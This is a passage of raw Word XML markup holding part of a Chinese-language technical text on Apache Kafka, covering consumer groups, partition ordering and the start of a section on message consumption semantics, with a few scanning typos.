        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>消费者：</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>本质上</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>kafka</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>只支持</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Topic.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>每个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>consumer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>属于一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>consumer group;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">反过来说，每个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>group</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中可以有多个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>consumer.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>发送到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Topic</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的消息，只会被订阅此</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Topic</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的每个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">group </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中的一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>consumer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>消费.</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>如果所有的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>consumer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>都具有相同的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>group,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>这种情况和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>queue</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">模式很像;消息将会在 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>consumers</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>之间负载</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>均衡.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>如果所有的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>consumer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>都具有不同的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>group,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>那这就是〃发布-订</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Rf;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>消息将会广播给所有 的消</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>费者.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="180" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>kafka</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中，一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>partition</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中的消息只会被</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>group</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中的一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>consumer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>消</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>费海个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">group </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>consumer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>消息消费互相独立;我们可以认为一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>group</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>是一个〃订阅〃者，一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Topic </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中的每个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>partions, R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>会被一个"订阅者'中的一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>consumer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>消费，不过一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">consumer </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>可以消费多个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>partitions</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中的消息</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>.kafka</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>只能保证一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>partition</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">中的消息被某个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>consumer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>消费时，消息是顺序的.事实上，从</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Topic</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>角度来说,消息仍不是有</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>序的.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="9"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="575"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="360" w:line="600" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="75" w:name="bookmark83"/>
      <w:bookmarkEnd w:id="75"/>
      <w:bookmarkStart w:id="76" w:name="bookmark84"/>
      <w:bookmarkStart w:id="77" w:name="bookmark82"/>
      <w:bookmarkStart w:id="78" w:name="bookmark81"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>kafka</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>三种消费语义与保证精准消费</w:t>
      </w:r>
      <w:bookmarkEnd w:id="76"/>
      <w:bookmarkEnd w:id="77"/>
      <w:bookmarkEnd w:id="78"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>1.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>消费语义的介绍</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>at last once:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>至少消费一次（对一条消急有可能多次消费，有可能会造成重复消费数 据）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>原因：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Proudcer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>产生数据的时候，已经写入在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>broker</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中，但是由于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>broker</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
